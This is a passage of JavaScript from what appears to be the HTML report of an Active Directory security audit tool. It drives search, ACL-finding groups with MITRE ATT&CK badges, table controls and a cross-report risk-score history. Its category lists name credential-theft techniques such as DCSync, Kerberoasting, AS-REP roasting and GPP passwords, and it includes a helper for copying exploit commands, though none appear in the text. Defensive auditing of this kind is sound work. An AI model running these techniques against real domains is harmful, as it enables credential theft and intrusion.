      const btn = document.createElement('button');
      btn.className = 'gs-tab-btn';
      btn.textContent = label + ' (' + cnt + ')';
      btn.onclick = function(e) { e.preventDefault(); gsGoTab(tab); };
      resultsEl.appendChild(btn);
    });

  // Auto-expand collapsed sections that contain matches
  _gsMatches.forEach(m => {
    // Expand .exp-section bodies (Exposure tab)
    const expBody = m.el.closest('.exp-body');
    if (expBody && expBody.style.display === 'none') {
      const expHeader = expBody.previousElementSibling;
      if (expHeader && expHeader.classList.contains('exp-header')) {
        expBody.style.display = '';
        const ch = expHeader.querySelector('.chevron');
        if (ch) ch.textContent = '▼';
      }
    }
  });

  // Expand ACL groups in #acl-grouped whose body contains highlighted matches
  document.querySelectorAll('#acl-grouped [data-right]').forEach(function(groupHeader) {
    const body = groupHeader.nextElementSibling;
    if (!body || !body.classList.contains('group-body')) return;
    if (body.querySelector('.gs-match') && body.style.display === 'none') {
      body.style.display = '';
      const ch = groupHeader.querySelector('.group-chevron');
      if (ch) ch.textContent = '▼';
    }
  });
}

// Navigate to a specific tab from search results
function gsGoTab(tabName) {
  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
  const pane = document.getElementById('tab-' + tabName);
  if (pane) pane.classList.add('active');
  const btn = document.querySelector('.nav button[onclick="showTab(\'' + tabName + '\')"]');
  if (btn) btn.classList.add('active');
  if (tabName === 'graph') initGraph();
  window.scrollTo({ top: 0, behavior: 'smooth' });
  // Scroll first match in this tab into view
  const firstMatch = document.querySelector('#tab-' + tabName + ' .gs-match');
  if (firstMatch) {
    setTimeout(() => firstMatch.scrollIntoView({ behavior: 'smooth', block: 'center' }), 150);
  }
}

// Navigate to tab with most matches (called on Enter key)
function gsNavigateFirst() {
  const entries = Object.entries(_gsTabCounts).sort((a, b) => b[1] - a[1]);
  if (entries.length > 0) gsGoTab(entries[0][0]);
}

function clearGlobalSearch() {
  _gsMatches.forEach(m => { if (m.el) m.el.innerHTML = m.origHTML; });
  _gsMatches = [];
  _gsTabCounts = {};
  const inp = document.getElementById('gs-input');
  if (inp) inp.value = '';
  document.getElementById('gs-results').innerHTML = '';
  const clearBtn = document.getElementById('gs-clear');
  if (clearBtn) clearBtn.style.display = 'none';
}

// MITRE badge HTML per ACL right
const _aclMitre = {
  'DCSync':              '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1003/006/" target="_blank" title="OS Credential Dumping: DCSync">T1003.006</a>',
  'GenericAll':          '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1222/" target="_blank" title="Permission Modification">T1222</a><a class="mitre-badge" href="https://attack.mitre.org/techniques/T1484/" target="_blank" title="Domain Policy Modification">T1484</a>',
  'WriteDACL':           '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1222/" target="_blank" title="Permission Modification">T1222</a><a class="mitre-badge" href="https://attack.mitre.org/techniques/T1484/" target="_blank" title="Domain Policy Modification">T1484</a>',
  'WriteOwner':          '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1222/" target="_blank" title="Permission Modification">T1222</a><a class="mitre-badge" href="https://attack.mitre.org/techniques/T1484/" target="_blank" title="Domain Policy Modification">T1484</a>',
  'GenericWrite':        '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1222/" target="_blank" title="Permission Modification">T1222</a><a class="mitre-badge" href="https://attack.mitre.org/techniques/T1484/" target="_blank" title="Domain Policy Modification">T1484</a>',
  'ForceChangePassword': '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1098/" target="_blank" title="Account Manipulation">T1098</a>',
  'AddMember':           '<a class="mitre-badge" href="https://attack.mitre.org/techniques/T1098/" target="_blank" title="Account Manipulation">T1098</a>',
};

const _ACL_GROUP_LIMIT = 50;

function buildGroupedACL() {
  const allCards = document.querySelectorAll('#acl-findings .acl-card');
  const groups = {};
  const order  = [];
  const sevOrder = { 'Critical': 0, 'High': 1, 'Medium': 2 };

  allCards.forEach(function(card) {
    if (card.dataset.filtered === 'true') return;
    const right = card.dataset.right || 'Unknown';
    const sev   = card.dataset.severity || 'Medium';
    if (!groups[right]) { groups[right] = { cards: [], severity: sev }; order.push(right); }
    groups[right].cards.push(card);
  });

  order.sort(function(a, b) {
    return (sevOrder[groups[a].severity] ?? 9) - (sevOrder[groups[b].severity] ?? 9);
  });

  const container = document.getElementById('acl-grouped');
  container.innerHTML = '';

  if (order.length === 0) {
    container.innerHTML = '<p style="color:var(--text-muted);padding:12px">No findings match the current filter.</p>';
    return;
  }

  const collapseByDefault = order.length > 3;

  order.forEach(function(right) {
    const g     = groups[right];
    const count = g.cards.length;
    const sevClass = g.severity === 'Critical' ? 'badge-critical' : g.severity === 'High' ? 'badge-high' : g.severity === 'Medium' ? 'badge-medium' : 'badge-ok';
    const mitreBadges = _aclMitre[right] || '';

    const section = document.createElement('div');
    section.style.cssText = 'margin-bottom:12px;border:1px solid var(--border);border-radius:8px;overflow:hidden';

    const header = document.createElement('div');
    header.style.cssText = 'display:flex;align-items:center;gap:10px;padding:12px 16px;background:var(--bg-grouped);border-bottom:1px solid var(--border);cursor:pointer;user-select:none';
    header.dataset.right = right;
    header.innerHTML =
      '<span class="chevron">▼</span>' +
      '<span class="badge badge-critical" style="font-family:monospace">' + right + '</span>' +
      mitreBadges +
      '<span class="badge ' + sevClass + '" style="margin-left:auto">' + g.severity + '</span>';

    const body = document.createElement('div');
    body.className = 'group-body';
    body.style.padding = '8px';
    g.cards.forEach(function(card, idx) {
      var clone = card.cloneNode(true);
      clone.style.display = '';
      if (idx >= _ACL_GROUP_LIMIT) {
        clone.classList.add('acl-hidden-overflow');
        clone.style.display = 'none';
      }
      body.appendChild(clone);
    });
    if (g.cards.length > _ACL_GROUP_LIMIT) {
      const showMore = document.createElement('button');
      showMore.className = 'show-all-btn';
      showMore.textContent = 'Show ' + (g.cards.length - _ACL_GROUP_LIMIT) + ' more in this group';
      showMore.onclick = function() {
        body.querySelectorAll('.acl-hidden-overflow').forEach(function(el) { el.style.display = ''; });
        showMore.remove();
      };
      body.appendChild(showMore);
    }

    if (collapseByDefault) {
      body.style.display = 'none';
      const ch = header.querySelector('.chevron');
      if (ch) ch.textContent = '▶';
    }

    const chevron = header.querySelector('.chevron');
    if (chevron) chevron.classList.add('group-chevron');

    header.onclick = function() {
      var open = body.style.display !== 'none';
      body.style.display = open ? 'none' : '';
      const ch = header.querySelector('.group-chevron');
      if (ch) ch.textContent = open ? '▶' : '▼';
    };

    section.appendChild(header);
    section.appendChild(body);
    container.appendChild(section);
  });
}

document.addEventListener('DOMContentLoaded', function() {
  if (document.querySelector('#acl-findings .acl-card')) buildGroupedACL();
});

// ── Collapsible exposure sections ────────────────────────────
document.addEventListener('click', function(e) {
  if (e.target.classList.contains('help-icon')) e.stopPropagation();
}, true);

function toggleExpSection(header) {
  const body = header.nextElementSibling;
  const open = body.style.display !== 'none';
  body.style.display = open ? 'none' : '';
  const ch = header.querySelector('.chevron');
  if (ch) ch.textContent = open ? '▶' : '▼';
}

function expandAllIn(sel) {
  document.querySelectorAll(sel + ' .exp-body').forEach(function(b) { b.style.display = ''; });
  document.querySelectorAll(sel + ' .exp-header .chevron').forEach(function(c) { c.textContent = '▼'; });
  document.querySelectorAll(sel + ' .group-body').forEach(function(b) { b.style.display = ''; });
  document.querySelectorAll(sel + ' .group-chevron').forEach(function(c) { c.textContent = '▼'; });
}

function collapseAllIn(sel) {
  document.querySelectorAll(sel + ' .exp-body').forEach(function(b) { b.style.display = 'none'; });
  document.querySelectorAll(sel + ' .exp-header .chevron').forEach(function(c) { c.textContent = '▶'; });
  document.querySelectorAll(sel + ' .group-body').forEach(function(b) { b.style.display = 'none'; });
  document.querySelectorAll(sel + ' .group-chevron').forEach(function(c) { c.textContent = '▶'; });
}

// ── Row limit (large tables) ──────────────────────────────────
const _ROW_LIMIT = 100;
function limitTableRows(tableId) {
  const tbody = document.querySelector('#' + tableId + ' tbody');
  if (!tbody) return;
  const rows = Array.from(tbody.rows);
  if (rows.length <= _ROW_LIMIT) return;
  rows.slice(_ROW_LIMIT).forEach(function(r) { r.style.display = 'none'; r.dataset.limited = '1'; });
  const wrap = tbody.closest('.table-wrap') || tbody.closest('table');
  const btn = document.createElement('button');
  btn.className = 'show-all-btn';
  btn.textContent = 'Show all ' + rows.length + ' rows (currently showing ' + _ROW_LIMIT + ')';
  btn.onclick = function() {
    rows.forEach(function(r) { if (r.dataset.limited) r.style.display = ''; });
    btn.remove();
  };
  (wrap || tbody).after(btn);
}
document.addEventListener('DOMContentLoaded', function() {
  ['tbl-users', 'tbl-groups', 'tbl-computers',
   'tbl-desc', 'tbl-stale-users', 'tbl-stale-comp', 'tbl-nolaps'].forEach(limitTableRows);
});

// ── Theme toggle ──────────────────────────────────────────────
function toggleTheme() {
  const html = document.documentElement;
  const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
  html.setAttribute('data-theme', next);
  localStorage.setItem('morok-theme', next);
  document.getElementById('theme-toggle').textContent = next === 'dark' ? '🌙' : '☀️';
  // Re-apply node colors now that CSS variables have changed
  if (typeof graphInitialized !== 'undefined' && graphInitialized) {
    d3.selectAll('#graph-svg .nodes circle').attr('fill', d => nodeColor(d));
  }
}
function initTheme() {
  const saved = localStorage.getItem('morok-theme') || 'dark';
  document.documentElement.setAttribute('data-theme', saved);
  const btn = document.getElementById('theme-toggle');
  if (btn) btn.textContent = saved === 'dark' ? '🌙' : '☀️';
}
initTheme();

// ── Smart help-icon tooltip ───────────────────────────────────
(function() {
  var tip = document.createElement('div');
  tip.id = 'help-tip';
  document.body.appendChild(tip);
  var active = null;
  function tipTarget(t) {
    if (!t.closest) return null;
    return t.closest('.help-icon') || t.closest('.cvss-score');
  }
  function show(el) {
    var text = el.getAttribute('data-tip');
    if (!text) return;
    tip.textContent = text;
    tip.style.display = 'block';
    var r = el.getBoundingClientRect();
    var tw = tip.offsetWidth, th = tip.offsetHeight;
    var top = r.top - th - 8;
    var left = r.left + r.width / 2 - tw / 2;
    if (left < 8) left = 8;
    if (left + tw > window.innerWidth - 8) left = window.innerWidth - tw - 8;
    if (top < 8) top = r.bottom + 8;
    tip.style.top = top + 'px';
    tip.style.left = left + 'px';
    active = el;
  }
  function hide() { tip.style.display = 'none'; active = null; }
  document.addEventListener('mouseover', function(e) {
    var el = tipTarget(e.target);
    if (el && el !== active) show(el);
  });
  document.addEventListener('mouseout', function(e) {
    if (tipTarget(e.target)) hide();
  });
  document.addEventListener('scroll', hide, true);
})();

// ── Column resize & reorder ────────────────────────────────────
function initTblControls(tbl) {
  tbl.querySelectorAll('thead th').forEach(function(th) {
    // resize handle
    if (!th.querySelector('.col-rh')) {
      const h = document.createElement('span');
      h.className = 'col-rh';
      th.appendChild(h);
      h.addEventListener('mousedown', function(e) {
        e.stopPropagation(); e.preventDefault();
        h.classList.add('active');
        const x0 = e.pageX, w0 = th.getBoundingClientRect().width;
        function onMove(ev) {
          const w = Math.max(44, w0 + ev.pageX - x0);
          th.style.minWidth = w + 'px'; th.style.width = w + 'px';
        }
        function onUp() {
          h.classList.remove('active');
          document.removeEventListener('mousemove', onMove);
          document.removeEventListener('mouseup', onUp);
        }
        document.addEventListener('mousemove', onMove);
        document.addEventListener('mouseup', onUp);
      });
    }
    // drag to reorder
    th.setAttribute('draggable', 'true');
    th.addEventListener('dragstart', function(e) {
      const ths = Array.from(tbl.querySelectorAll('thead th'));
      tbl._dragFrom = ths.indexOf(th);
      tbl._dragOccurred = true;
      th.classList.add('col-dragging');
      e.dataTransfer.effectAllowed = 'move';
      e.dataTransfer.setData('text/plain', '');
    });
    th.addEventListener('dragend', function() {
      th.classList.remove('col-dragging');
      tbl.querySelectorAll('th').forEach(function(t) { t.classList.remove('col-over'); });
    });
    th.addEventListener('dragover', function(e) {
      if (e.target.closest('table') !== tbl) return;
      e.preventDefault();
      tbl.querySelectorAll('th').forEach(function(t) { t.classList.remove('col-over'); });
      th.classList.add('col-over');
    });
    th.addEventListener('drop', function(e) {
      e.preventDefault();
      const ths = Array.from(tbl.querySelectorAll('thead th'));
      const to = ths.indexOf(th);
      const from = tbl._dragFrom;
      if (from !== undefined && from !== to) moveCol(tbl, from, to);
      th.classList.remove('col-over');
    });
  });
}

function moveCol(tbl, from, to) {
  const n = tbl.querySelector('thead tr').children.length;
  // build position map: order[newPos] = oldPos
  const order = Array.from({length: n}, function(_, i) { return i; });
  const moved = order.splice(from, 1)[0];
  order.splice(to, 0, moved);

  tbl.querySelectorAll('tr').forEach(function(row) {
    const cells = Array.from(row.children);
    if (cells.length < n) return;
    const reordered = order.map(function(i) { return cells[i]; });
    reordered.forEach(function(cell) { row.appendChild(cell); });
  });

  // update filter data-col indices so filters still work
  const wrap = tbl.closest('.table-wrap');
  if (wrap) {
    const bar = wrap.previousElementSibling;
    if (bar) {
      bar.querySelectorAll('select[data-col]').forEach(function(sel) {
        const oldCol = parseInt(sel.dataset.col);
        const newPos = order.indexOf(oldCol);
        if (newPos !== -1) sel.dataset.col = newPos;
      });
    }
  }
}

document.addEventListener('DOMContentLoaded', function() {
  document.querySelectorAll('table').forEach(initTblControls);
});

// ── Copy exploit command to clipboard ─────────────────────────
function _copyText(text, onDone) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(onDone).catch(function() { _copyFallback(text, onDone); });
  } else {
    _copyFallback(text, onDone);
  }
}
function _copyFallback(text, onDone) {
  var ta = document.createElement('textarea');
  ta.value = text;
  ta.setAttribute('readonly', '');
  ta.style.cssText = 'position:absolute;left:-9999px;top:0;width:2px;height:2px';
  document.body.appendChild(ta);
  ta.focus(); ta.select(); ta.setSelectionRange(0, 99999);
  try { document.execCommand('copy'); } catch(e) {}
  document.body.removeChild(ta);
  if (onDone) onDone();
}

function copyCVSS(el) {
  var vec = el.dataset.vector;
  if (!vec) return;
  var full = 'CVSS:3.1/' + vec;
  _copyText(full, function() {
    el.setAttribute('data-copied', '');
    setTimeout(function() { el.removeAttribute('data-copied'); }, 1800);
  });
}

function copyCmd(btn) {
  const cmd = btn.previousElementSibling.textContent;
  _copyText(cmd, function() {
    btn.classList.add('copied');
    btn.textContent = '✓';
    setTimeout(function() {
      btn.classList.remove('copied');
      btn.textContent = '📋';
    }, 1500);
  });
}

// ============================================================
// History tab — cross-report comparison
// ============================================================

var _histSnapshots = [];
var _histCurrentSnap = null;
function _histInitCurrentSnap() {
  if (_histCurrentSnap) return;
  try { _histCurrentSnap = JSON.parse(document.getElementById('morok-data').textContent); } catch(e) {}
}

var _HIST_CATEGORIES = [
  { key: 'kerberoastable',    label: 'Kerberoastable',          tab: 'kerberos' },
  { key: 'asrep',             label: 'AS-REP Roastable',        tab: 'kerberos' },
  { key: 'acl',               label: 'Dangerous ACLs',          tab: 'acl' },
  { key: 'unconstrained_deleg', label: 'Unconstrained Delegation', tab: 'delegation' },
  { key: 'constrained_deleg', label: 'Constrained Delegation',  tab: 'delegation' },
  { key: 'rbcd',              label: 'RBCD',                    tab: 'delegation' },
  { key: 'attack_paths',      label: 'Attack Paths',            tab: 'paths' },
  { key: 'adcs_templates',    label: 'ADCS Templates',          tab: 'adcs' },
  { key: 'shadow_creds',      label: 'Shadow Credentials',      tab: 'shadow' },
  { key: 'gpo_write',         label: 'GPO Write ACL',           tab: 'gpo' },
  { key: 'gpp_passwords',     label: 'GPP Passwords',           tab: 'gpo' },
];

function loadHistoryFiles(input) {
  _histInitCurrentSnap();
  var files = Array.from(input.files);
  if (!files.length) return;
  var errors = [];
  var pending = files.length;
  files.forEach(function(file) {
    var reader = new FileReader();
    reader.onload = function(e) {
      var ok = false;
      try {
        var parser = new DOMParser();
        var doc = parser.parseFromString(e.target.result, 'text/html');
        var el = doc.getElementById('morok-data');
        if (!el) {
          errors.push(file.name + ': not a morok report (no embedded data block — must be v1.1.0+)');
        } else {
          var snap = JSON.parse(el.textContent);
          if (!snap.v || !snap.generated_at) {
            errors.push(file.name + ': unrecognised snapshot format');
          } else {
            snap._filename = file.name;
            var exists = _histSnapshots.some(function(s) { return s.generated_at === snap.generated_at; });
            if (exists) {
              errors.push(file.name + ': already loaded (same timestamp)');
            } else {
              _histSnapshots.push(snap);
              ok = true;
            }
          }
        }
      } catch(ex) {
        errors.push(file.name + ': failed to parse (' + ex.message + ')');
      }
      if (--pending === 0) {
        var errEl = document.getElementById('history-load-errors');
        if (errors.length) {
          errEl.style.display = '';
          errEl.innerHTML = '<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:12px">' +
            '<div>&#10007; ' + errors.map(_histEsc).join('<br>&#10007; ') + '</div>' +
            '<button onclick="document.getElementById(\'history-load-errors\').style.display=\'none\'" ' +
              'style="background:none;border:none;cursor:pointer;font-size:1rem;color:var(--text-muted);' +
              'padding:0;line-height:1;flex-shrink:0" aria-label="Dismiss">&times;</button>' +
          '</div>';
          clearTimeout(errEl._hideTimer);
          errEl._hideTimer = setTimeout(function() { errEl.style.display = 'none'; }, 6000);
        } else {
          errEl.style.display = 'none';
        }
        _histRender();
      }
    };
    reader.readAsText(file);
  });
}

function _histRender() {
  if (!_histCurrentSnap || !_histSnapshots.length) return;
  _histSnapshots.sort(function(a, b) { return a.generated_at.localeCompare(b.generated_at); });

  var curDomain = _histCurrentSnap.domain || '';
  var mismatched = _histSnapshots
    .filter(function(s) { return s.domain && s.domain !== curDomain; })
    .map(function(s) { return s.domain; })
    .filter(function(d, i, arr) { return arr.indexOf(d) === i; });
  var warnEl = document.getElementById('history-domain-warning');
  if (mismatched.length) {
    warnEl.style.display = '';
    warnEl.innerHTML = '&#9888;&#65039; Domain mismatch: baseline(s) are for <strong>' +
      mismatched.map(_histEsc).join(', ') + '</strong>, current is <strong>' +
      _histEsc(curDomain) + '</strong>. Comparison may be inaccurate.';
  } else {
    warnEl.style.display = 'none';
  }

  _histRenderVerdict();
  _histRenderSummaryCards();
  _histRenderTrendChart();
  _histRenderTimeline();
  _histRenderBarChart();
  document.getElementById('history-empty').style.display = 'none';
  document.getElementById('history-content').style.display = '';
}

function _histSurface(snap) {
  var c = snap.counts || {};
  return (c.critical || 0) * 3 + (c.high || 0) * 2 + (c.medium || 0);
}

function _histPct(baseline, current) {
  if (!baseline) return null;
  return Math.round((current - baseline) / baseline * 100);
}

function _histMetricCard(label, baseVal, curVal, unit, lowerIsBetter) {
  var pct = _histPct(baseVal, curVal);
  var same = curVal === baseVal;
  var improved = lowerIsBetter ? curVal < baseVal : curVal > baseVal;
  var deltaColor = same ? 'var(--text-muted)' : (improved ? '#4caf50' : 'var(--sev-critical)');
  var arrow = same ? '—' : (curVal < baseVal ? '↓' : '↑');
  var pctStr = pct === null ? '' : (pct > 0 ? '+' : '') + pct + '%';

  return '<div style="background:var(--bg-card);border:1px solid var(--border);' +
    'border-radius:8px;padding:18px 22px;display:flex;align-items:center;' +
    'justify-content:space-between;gap:16px;min-height:104px">' +

    '<div style="display:flex;flex-direction:column;gap:6px">' +
      '<div style="font-size:0.72rem;color:var(--text-muted);font-weight:600;' +
        'text-transform:uppercase;letter-spacing:0.06em">' + label + '</div>' +
      '<div style="display:flex;align-items:baseline;gap:6px">' +
        '<span style="font-size:2.4rem;font-weight:800;line-height:1;' +
          'color:var(--text-main)">' + curVal + '</span>' +
        (unit ? '<span style="font-size:0.85rem;color:var(--text-muted)">' +
          unit + '</span>' : '') +
      '</div>' +
    '</div>' +

    '<div style="display:flex;flex-direction:column;align-items:flex-end;gap:3px">' +
      '<div style="display:flex;align-items:center;gap:6px;font-size:1.25rem;' +
        'font-weight:800;color:' + deltaColor + '">' +
        '<span style="font-size:1.1rem">' + arrow + '</span>' +
        '<span>' + pctStr + '</span>' +
      '</div>' +
      '<div style="font-size:0.8rem;color:var(--text-muted)">was ' + baseVal + '</div>' +
      (lowerIsBetter && curVal > 0 && !same
        ? '<div style="font-size:0.72rem;color:var(--text-muted)">' +
          curVal + ' remaining</div>'
        : '') +
    '</div>' +
  '</div>';
}

function _histRenderSummaryCards() {
  var container = document.getElementById('history-summary-cards');
  var baseline = _histSnapshots[0];
  var cur = _histCurrentSnap;
  var html = '';
  html += _histMetricCard('Risk Score',
    baseline.score ? baseline.score.value : 0,
    cur.score ? cur.score.value : 0,
    '/100', true);
  html += _histMetricCard('Attack Surface',
    _histSurface(baseline), _histSurface(cur), 'pts', true);
  html += _histMetricCard('Attack Paths',
    ((baseline.findings || {}).attack_paths || []).length,
    ((cur.findings || {}).attack_paths || []).length,
    'paths', true);
  html += _histMetricCard('Critical Findings',
    baseline.counts ? baseline.counts.critical : 0,
    cur.counts ? cur.counts.critical : 0,
    '', true);
  container.innerHTML = html;
}

function _histGradeColor(grade) {
  var m = { A: '#4caf50', B: '#8bc34a', C: 'var(--sev-medium)', D: 'var(--sev-high)', F: 'var(--sev-critical)' };
  return m[grade] || 'var(--text-muted)';
}

function _histRenderTimeline() {
  var cur = _histCurrentSnap;
  var all = _histSnapshots.concat([{ _cur: true, generated_at: cur.generated_at, domain: cur.domain, score: cur.score, counts: cur.counts }]);
  var tbody = document.getElementById('history-timeline-body');
  tbody.innerHTML = '';
  all.forEach(function(snap) {
    var grade = snap.score ? snap.score.grade : '?';
    var value = snap.score ? snap.score.value : '?';
    var c = snap.counts || {};
    var isCur = !!snap._cur;
    var tr = document.createElement('tr');
    tr.style.cssText = 'border-bottom:1px solid var(--border)' + (isCur ? ';background:var(--bg-card)' : '');
    var domainMismatch = !isCur && snap.domain && snap.domain !== (_histCurrentSnap.domain || '');
    tr.innerHTML =
      '<td style="padding:10px 12px">' + snap.generated_at +
        (isCur ? ' <span style="font-size:0.7rem;background:var(--accent);color:#fff;padding:2px 6px;border-radius:3px;margin-left:6px;vertical-align:middle">CURRENT</span>' : '') + '</td>' +
      '<td style="padding:10px 12px">' + (snap.domain || '') +
        (domainMismatch ? ' <span style="font-size:0.7rem;background:var(--sev-medium);color:#fff;padding:2px 5px;border-radius:3px;margin-left:4px">&#8800; domain</span>' : '') + '</td>' +
      '<td style="padding:10px 12px;text-align:center;font-weight:700;color:' + _histGradeColor(grade) + '">' + grade + '</td>' +
      '<td style="padding:10px 12px;text-align:center">' + value + '/100</td>' +
      '<td style="padding:10px 12px;text-align:center;color:var(--sev-critical);font-weight:600">' + (c.critical != null ? c.critical : '?') + '</td>' +
      '<td style="padding:10px 12px;text-align:center;color:var(--sev-high);font-weight:600">' + (c.high != null ? c.high : '?') + '</td>' +
      '<td style="padding:10px 12px;text-align:center;color:var(--sev-medium);font-weight:600">' + (c.medium != null ? c.medium : '?') + '</td>';
    tbody.appendChild(tr);
  });
}

function _histDaysBetween(d1, d2) {
  var t1 = new Date(d1.replace(' ', 'T')).getTime();
  var t2 = new Date(d2.replace(' ', 'T')).getTime();
  if (isNaN(t1) || isNaN(t2)) return null;
  return Math.round(Math.abs(t2 - t1) / 86400000);
}

function _histRenderVerdict() {
  var baseline = _histSnapshots[0];
  var cur = _histCurrentSnap;

  var bScore = baseline.score ? baseline.score.value : 0;
  var cScore = cur.score ? cur.score.value : 0;
  var bGrade = baseline.score ? baseline.score.grade : '?';
  var cGrade = cur.score ? cur.score.grade : '?';
  var days = _histDaysBetween(baseline.generated_at, cur.generated_at);

  var resolved = 0, regressed = 0, outstanding = 0;
  _HIST_CATEGORIES.forEach(function(cat) {
    var bv = ((baseline.findings || {})[cat.key] || []).length;
    var cv = ((cur.findings || {})[cat.key] || []).length;
    if (bv === 0 && cv === 0) return;
    if (cv < bv) resolved++;
    else if (cv > bv) regressed++;
    else outstanding++;
  });

  var topThreat = null, topCount = 0;
  _HIST_CATEGORIES.forEach(function(cat) {
    var cv = ((cur.findings || {})[cat.key] || []).length;
    if (cv > topCount) { topCount = cv; topThreat = cat.label; }
  });

  var scoreDelta = bScore - cScore;
  var improved = scoreDelta > 0;

  var headline;
  if (improved) {
    headline = 'Security posture improved from grade ' + bGrade + ' (' + bScore +
      ') to ' + cGrade + ' (' + cScore + ')' +
      (days != null ? ' over ' + days + ' days' : '') + '.';
  } else if (scoreDelta === 0) {
    headline = 'No change in overall risk score (' + cGrade + ', ' + cScore + '/100)' +
      (days != null ? ' over ' + days + ' days' : '') + '.';
  } else {
    headline = 'Security posture regressed from grade ' + bGrade + ' (' + bScore +
      ') to ' + cGrade + ' (' + cScore + ')' +
      (days != null ? ' over ' + days + ' days' : '') + '.';
  }

  var parts = [];
  if (resolved > 0) parts.push(resolved + ' categor' + (resolved === 1 ? 'y' : 'ies') + ' improved or resolved');
  if (regressed > 0) parts.push(regressed + ' regressed');
  if (outstanding > 0) parts.push(outstanding + ' unchanged');
  var detail = parts.join(', ') + '.';

  var threatLine = '';
  if (topThreat && topCount > 0) {
    threatLine = ' Largest remaining exposure: <strong>' + _histEsc(topThreat) +
      '</strong> (' + topCount + ' finding' + (topCount === 1 ? '' : 's') + ').';
  }

  var accentColor = improved ? '#4caf50' : (scoreDelta === 0 ? 'var(--text-muted)' : 'var(--sev-critical)');
  var el = document.getElementById('history-verdict');
  el.style.borderLeftColor = accentColor;
  el.innerHTML =
    '<div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;' +
      'letter-spacing:0.08em;font-weight:600;margin-bottom:8px">Executive Verdict</div>' +
    '<div style="font-size:1.15rem;font-weight:600;color:var(--text-main);line-height:1.5;margin-bottom:6px">' +
      _histEsc(headline) + '</div>' +
    '<div style="font-size:0.9rem;color:var(--text-muted);line-height:1.5">' +
      _histEsc(detail) + threatLine + '</div>';
}

function _histRenderTrendChart() {
  var cur = _histCurrentSnap;
  var points = _histSnapshots.slice().concat([cur]).map(function(s) {
    return { date: s.generated_at, score: s.score ? s.score.value : 0, grade: s.score ? s.score.grade : '?' };
  });

  if (points.length < 2) {
    document.getElementById('history-trend-chart').innerHTML = '';
    return;
  }

  var W = 720, H = 160, padL = 56, padR = 16, padT = 28, padB = 32;
  var plotW = W - padL - padR, plotH = H - padT - padB;
  var n = points.length;
  var x = function(i) { return padL + (n === 1 ? plotW / 2 : (i / (n - 1)) * plotW); };
  var y = function(v) { return padT + (1 - v / 100) * plotH; };

  var d = points.map(function(p, i) {
    return (i === 0 ? 'M' : 'L') + x(i).toFixed(1) + ' ' + y(p.score).toFixed(1);
  }).join(' ');
  var area = d + ' L' + x(n - 1).toFixed(1) + ' ' + (padT + plotH) +
    ' L' + x(0).toFixed(1) + ' ' + (padT + plotH) + ' Z';

  var trendColor = points[n - 1].score < points[0].score ? '#4caf50'
    : points[n - 1].score > points[0].score ? 'var(--sev-critical)'
    : 'var(--text-muted)';

  var svg = '<svg viewBox="0 0 ' + W + ' ' + H + '" ' +
    'style="width:100%;max-width:' + W + 'px;height:auto;font-family:inherit" ' +
    'role="img" aria-label="Risk score trend over time">';

  [0, 25, 50, 75, 100].forEach(function(v) {
    var gy = y(v);
    svg += '<line x1="' + padL + '" y1="' + gy.toFixed(1) + '" x2="' + (W - padR) +
      '" y2="' + gy.toFixed(1) + '" stroke="var(--border)" stroke-width="1"/>';
    svg += '<text x="' + (padL - 8) + '" y="' + (gy + 3).toFixed(1) +
      '" text-anchor="end" font-size="10" fill="var(--text-muted)">' + v + '</text>';
  });

  svg += '<path d="' + area + '" fill="' + trendColor + '" opacity="0.12"/>';
  svg += '<path d="' + d + '" fill="none" stroke="' + trendColor +
    '" stroke-width="2.5" stroke-linejoin="round" stroke-linecap="round"/>';

  points.forEach(function(p, i) {
    var px = x(i), py = y(p.score);
    svg += '<circle cx="' + px.toFixed(1) + '" cy="' + py.toFixed(1) +
      '" r="4" fill="var(--bg-page)" stroke="' + trendColor + '" stroke-width="2"/>';
    var labelY = py - 10;
    if (labelY < 11) labelY = py + 16;
    svg += '<text x="' + px.toFixed(1) + '" y="' + labelY.toFixed(1) +
      '" text-anchor="middle" font-size="10" font-weight="700" fill="var(--text-main)">' + p.score + '</text>';
    var shortDate = (p.date || '').split(' ')[0];
    svg += '<text x="' + px.toFixed(1) + '" y="' + (H - 10) +
      '" text-anchor="middle" font-size="9" fill="var(--text-muted)">' + shortDate + '</text>';
  });

  svg += '</svg>';
  document.getElementById('history-trend-chart').innerHTML = svg;
}

function _histBar(value, maxVal, color) {
  var pct = Math.round((value / maxVal) * 100);
  return '<div style="flex:1;background:var(--bg-hover);border-radius:3px;height:12px;overflow:hidden">' +
    (value > 0
      ? '<div style="width:' + pct + '%;height:100%;background:' + color + ';border-radius:3px"></div>'
      : '') +
  '</div>';
}

function _histRenderBarChart() {
  var container = document.getElementById('history-bar-chart');
  container.innerHTML = '';
  var baseline = _histSnapshots[0];  // OLDEST baseline
  var cur = _histCurrentSnap;
  var baseDate = (baseline.generated_at || '').split(' ')[0];
  var curDate = (cur.generated_at || '').split(' ')[0];

  var captionEl = document.getElementById('history-findings-caption');
  if (captionEl) {
    captionEl.textContent = 'Comparing oldest baseline (' + baseDate + ') vs current (' +
      curDate + ') — intermediate reports shown in the timeline above. Click a category to open its tab.';
  }

  var regressed = [], resolved = [], outstanding = [];
  _HIST_CATEGORIES.forEach(function(cat) {
    var bv = ((baseline.findings || {})[cat.key] || []).length;
    var cv = ((cur.findings || {})[cat.key] || []).length;
    if (bv === 0 && cv === 0) return;
    var row = { label: cat.label, tab: cat.tab, b: bv, c: cv, isNew: bv === 0 && cv > 0 };
    if (cv > bv) regressed.push(row);
    else if (cv < bv) resolved.push(row);
    else outstanding.push(row);
  });

  if (!regressed.length && !resolved.length && !outstanding.length) {
    container.innerHTML = '<p style="color:var(--text-muted);font-size:0.85rem">No findings to compare.</p>';
    return;
  }

  var allRows = regressed.concat(resolved).concat(outstanding);
  var maxVal = Math.max.apply(null, allRows.map(function(d) { return Math.max(d.b, d.c); })) || 1;
  var ctx = { maxVal: maxVal, baseDate: baseDate, curDate: curDate };

  var html = '';
